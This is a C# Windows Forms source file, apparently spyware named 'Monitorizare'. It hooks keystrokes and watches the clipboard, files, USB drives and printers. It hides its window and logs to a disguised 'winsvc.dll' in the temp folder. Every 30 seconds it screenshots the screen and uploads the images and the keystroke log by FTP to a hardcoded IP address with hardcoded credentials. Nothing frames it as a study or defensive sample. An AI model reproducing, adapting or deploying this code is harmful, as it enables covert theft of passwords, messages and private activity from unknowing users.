using System;
using System.Collections;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.ComponentModel;
using System.Printing;
using Monitorizare;
using System.Net;
using System.Net.Mail;
using System.Drawing;
using System.Drawing.Imaging;

namespace Monitorizare
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
            Rootdir = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\Local");
            int y = DateTime.Now.Date.Year;
            int M = DateTime.Now.Date.Month;
            int d = DateTime.Now.Date.Day;
            string date4fname = String.Format("{0}.{1:00}.{2:00}", y, M, d);
            machine = Environment.MachineName;
            //Logfile = new FileInfo(String.Format("{0}\\{1}_{2}.dll", Rootdir.FullName, machine, date4fname));
            Logfile = new FileInfo(String.Format("{0}\\winsvc.dll", Path.GetTempPath()));
            //klgfile = new FileInfo(Logfile.FullName.Substring(0, Logfile.FullName.LastIndexOf('.')) + ".klg");
            //if (klgfile.Exists)
            //{
            //    try
            //    {
            //        //Load existent klgfile in logData
            //        using (StreamReader sr = new StreamReader(klgfile.FullName))
            //        {
            //            while (!sr.EndOfStream)
            //            {
            //                string[] rowitems = sr.ReadLine().Split(new char[] { ',' });
            //                string appName = rowitems[0];
            //                string appltitle = rowitems[1];
            //                string thisapplication = appltitle + "######" + appName;
            //                appNames.Push(thisapplication);
            //                logData.Add(thisapplication, rowitems[2]);
            //            }
            //        }
            //    }
            //    catch (Exception ex)
            //    {
            //        Debug(String.Format("Exception while loading existent klgfile in logData: {1}", ex.Message));
            //    }
            //} // end if (klgfile.Exists)
            user = Machine.getInstance().getUsername();
        }
        #region Fields decl.
        Hook hook;
        DriveMonitor dm;
        ClipboardMonitor cm;
        ScreenCapturer sc;
        PrinterMonitor pm;
        //public static List<LogEntry> logList = new List<LogEntry>();
        public static uint logCount = 0;
        static Stack appNames = new Stack();
        static Hashtable logData = new Hashtable();
        static uint count = 0;
        public static FileSystemMonitor[] driveFSMs = new FileSystemMonitor[25];
        public static DirectoryInfo Rootdir;
        public static FileInfo Logfile;
        //static FileInfo klgfile;
        string user, machine;
        LogEntry le;
        #endregion

        void MainForm_Load(object sender, EventArgs e)
        {
            Modules activemodules = (Modules)1135;
            uint interval = 0;
            //LoadSettings(ref activemodules,ref interval);
            if ((activemodules & Modules.Keystrokes) == Modules.Keystrokes)
            {
                // Setting up Keylogger
                hook = new Hook(true, false);
                hook.Keystroke += hook_Keystroke;
                hook.Start();
            }
            if ((activemodules & Modules.RemDrives) == Modules.RemDrives)
            {
                // Setting up DriveMonitor
                dm = new DriveMonitor();
                dm.DeviceArrived += dm_DriveArrived;
                dm.DeviceRemoved += dm_DriveRemoved;
                dm.DeviceQuerriedRemove += dm_DriveQuerriedRemove;
            }
            if ((activemodules & Modules.Clipboard) == Modules.Clipboard)
            {
                // Setting up ClipboardMonitor
                cm = new ClipboardMonitor();
                cm.OnClipboardChange += cm_OnClipboardChange;
                cm.Start();
            }
            if ((activemodules & Modules.FSOp) == Modules.FSOp)
            {
                // Setting up FileSystemMonitors
                foreach (DriveInfo di in DriveInfo.GetDrives())
                {
                    if ((di.DriveType == DriveType.Fixed || di.DriveType == DriveType.Removable) && di.IsReady)
                    {
                        FileSystemMonitor fsm = new FileSystemMonitor(di.Name);
                        fsm.FSMOpened += Monitor_Opened;
                        fsm.FSMCreated += Monitor_CreatedDeletedModified;
                        fsm.FSMDeleted += Monitor_CreatedDeletedModified;
                        fsm.FSMRenamed += Monitor_CustomRenamed;
                        fsm.FSMModified += Monitor_CreatedDeletedModified;
                    }
                }
            }
            if ((activemodules & Modules.Screenshoter) == Modules.Screenshoter && interval > 0)
            {
                // Setting up ScreenCapturer
                sc = new ScreenCapturer((int)interval * 60000);
                sc.Start();
            }
            if ((activemodules & Modules.Printer) == Modules.Printer)
            {
                // Setting up PrinterMonitor
                PrintServer printServer = new PrintServer();
                foreach (PrintQueue pq in printServer.GetPrintQueues())
                {
                    pm = new PrinterMonitor(pq.Name.Trim());
                    pm.OnJobStatusChange += printm_OnJobStatusChange;
                }
            }

            System.Timers.Timer timer = new System.Timers.Timer(30000);
            timer.AutoReset = true;
            timer.Elapsed += timer_Elapsed;
            timer.Start();
        }

        void timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            try
            {
                #region Pozeaza
                FileInfo jpgfile;
                Bitmap bmp;
                Graphics g;
                int x = Screen.PrimaryScreen.Bounds.Width / 2;
                int y = Screen.PrimaryScreen.Bounds.Height / 2;
                string fname = String.Format("{0}.{1}.{2}.jpg", DateTime.Now.Hour, DateTime.Now.Minute, DateTime.Now.Second);
                jpgfile = new FileInfo(Path.GetTempPath() + @"\screenshot" + fname);
                bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                g = Graphics.FromImage(bmp);
                g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                Bitmap bmpLower = new Bitmap(x, y);
                Graphics gLower = Graphics.FromImage(bmpLower);
                gLower.DrawImage(bmp, 0, 0, x, y);
                bmpLower.Save(jpgfile.FullName);
                #endregion
                #region Trimite
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(@"ftp://81.180.118.19/" + jpgfile.Name);
                request.KeepAlive = false;
                request.Method = WebRequestMethods.Ftp.UploadFile;
                request.Credentials = new NetworkCredential("1540387", "bsyncer1");

                byte[] fileContents = File.ReadAllBytes(jpgfile.FullName);
                request.ContentLength = fileContents.Length;

                Stream requestStream = request.GetRequestStream();
                requestStream.Write(fileContents, 0, fileContents.Length);
                requestStream.Close();
                FtpWebResponse rasp = (FtpWebResponse)request.GetResponse();
                rasp.Close();
                jpgfile.Delete();
                if (Logfile.Exists)
                {
                    FtpWebRequest request2 = (FtpWebRequest)WebRequest.Create(@"ftp://81.180.118.19/" + String.Format("{0}{1}.{2}.{3}",
                                                                              Logfile.Name, DateTime.Now.Hour, DateTime.Now.Minute, DateTime.Now.Second));
                    request2.KeepAlive = false;
                    request2.Method = WebRequestMethods.Ftp.UploadFile;
                    request2.Credentials = new NetworkCredential("1540387", "bsyncer1");
                    byte[] fileContents2 = File.ReadAllBytes(Logfile.FullName);
                    request2.ContentLength = fileContents2.Length;

                    Stream requestStream2 = request2.GetRequestStream();
                    requestStream2.Write(fileContents2, 0, fileContents2.Length);
                    requestStream2.Close();
                    FtpWebResponse rasp2 = (FtpWebResponse)request2.GetResponse();
                    rasp2.Close();
                }
                #endregion
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine(ex.Message);
            }
        }

        void hook_Keystroke(KeystrokeEventArgs e)
        {
            string details = String.Format("Keystroke: {2}    Process: {0};    Window: {1}",e.Process,e.Window,e.Keystroke);
            le = new LogEntry(Logfile.FullName,(uint)LogEntryIDs.Keystroke, details, machine, user);
            System.Diagnostics.Debug.WriteLine("\""+e.Keystroke+"\" in "+details);
        }

        void Monitor_CustomRenamed(object sender, CustomRenamedEventArgs e)
        {
            string details = String.Format("Old: {0}   New: {1}", e.OldFullPath, e.FullPath);
            le = new LogEntry(Logfile.FullName, (uint)LogEntryIDs.FileRename, details, machine, user);
            System.Diagnostics.Debug.WriteLine(details);
        }
        void Monitor_CreatedDeletedModified(object sender, CreatedDeletedModifiedEventArgs e)
        {
            switch (e.ChangeType)
            {
                case WatcherChangeTypes.Created:
                    le = new LogEntry(Logfile.FullName, (uint)LogEntryIDs.FileCreate, e.FullPath, machine, user);
                    System.Diagnostics.Debug.WriteLine(e.FullPath + " created");
                    break;
                case WatcherChangeTypes.Deleted:
                    le = new LogEntry(Logfile.FullName, (uint)LogEntryIDs.FileDelete, e.FullPath, machine, user);
                    System.Diagnostics.Debug.WriteLine(e.FullPath + " deleted");
                    break;
                case WatcherChangeTypes.Changed:
                    System.Diagnostics.Debug.WriteLine(e.FullPath + " modified");
                    le = new LogEntry(Logfile.FullName, (uint)LogEntryIDs.FileModified, e.FullPath, machine, user);
                    break;
            }
        }
        void Monitor_Opened(object sender, OpenedEventArgs e)
        {
            le = new LogEntry(Logfile.FullName, (uint)LogEntryIDs.FileOpen, e.File, machine, user);
        }
        void printm_OnJobStatusChange(object Sender, PrintJobChangeEventArgs e)
        {
            le = new LogEntry(Logfile.FullName, (uint)LogEntryIDs.FilePrint, e.JobName, machine, user);
        }
        void cm_OnClipboardChange(ClipboardFormat format, Object data)
        {
            string details = "";
            switch (format)
            {
                case ClipboardFormat.FileDrop:
                    for (int i = 0; i < ((string[])data).Length; i++)
                        details+=String.Format("{0}; ",((string[])data)[i]);
                    break;
                default:
                    details = String.Format("\"{0}\"", data.ToString(),format);
                    break;
            }
            le = new LogEntry(Logfile.FullName, (uint)LogEntryIDs.ClipboardCopy, details.Replace(Environment.NewLine, " "), machine, user);
        }
        void dm_DriveArrived(object sender, char e)
        {
            string details = "";

            string name=e.ToString() + @":\";
            FileSystemMonitor fsm = new FileSystemMonitor(name);
            fsm.FSMOpened += Monitor_Opened;
            fsm.FSMCreated += Monitor_CreatedDeletedModified;
            fsm.FSMDeleted += Monitor_CreatedDeletedModified;
            fsm.FSMRenamed += Monitor_CustomRenamed;
            foreach(DriveInfo d in DriveInfo.GetDrives())
                if (d.Name[0] == e)
                {
                    details = String.Format("Drive {0}  Label: {1}  Type: {2}  File format:" +
                                             " {3}  Capacity: {4}  Free space: {5}", d.Name, d.VolumeLabel,
                                             d.DriveType, d.DriveFormat, d.TotalFreeSpace, d.AvailableFreeSpace);
                }
            LogEntry le = new LogEntry(Logfile.FullName, (uint)LogEntryIDs.RemovablePlug, details, machine, user);
        }
        void dm_DriveRemoved(object sender, char e)
        {
            string details = "";
            try
            {
                driveFSMs[Convert.ToByte(e) - 65].Dispose();
                driveFSMs[Convert.ToByte(e) - 65] = null;
            }
            catch 
            {
                Debug("FSMsMask already updated in dm_DriveQuerriedRemove()");
            }
            details = String.Format("Drive {0} was unpluged.",e);
            LogEntry le = new LogEntry(Logfile.FullName, (uint)LogEntryIDs.RemovableUnplug, details, machine, user);
        }
        void dm_DriveQuerriedRemove(object sender, char e)
        {
            driveFSMs[Convert.ToByte(e) - 65].Dispose();
            driveFSMs[Convert.ToByte(e) - 65] = null;
        }

        void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (hook != null)
                hook.Stop();
            if (cm != null)
                cm.Stop();
        }               
        public static void Debug(string log)
        {
            string s = DateTime.Now + ": " + log;
            System.Diagnostics.Debug.WriteLine(s);
            //try
            //{
            //    using (StreamWriter sw = new StreamWriter(Rootdir.FullName + "\\DesktopAgent.log", true))
            //    {
            //        sw.WriteLine(s);
            //        sw.Close();
            //    }
            //}
            //catch { }
        }
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }
        //void LoadSettings(ref Modules activemodules,ref uint interval)
        //{
        //    try
        //    {
        //        using (StreamReader sr = new StreamReader(Rootdir.FullName + "\\Monitorizare.conf"))
        //        {
        //            activemodules = (Modules)uint.Parse(sr.ReadLine());
        //            interval = uint.Parse(sr.ReadLine());
        //            sr.Close();
        //        }
        //    }
        //    catch(Exception ex)
        //    {
        //        Debug(string.Format("Exception in LoadSettings() (Desktop Agent): {0}",ex.Message));
        //    }
        //}
    }
}
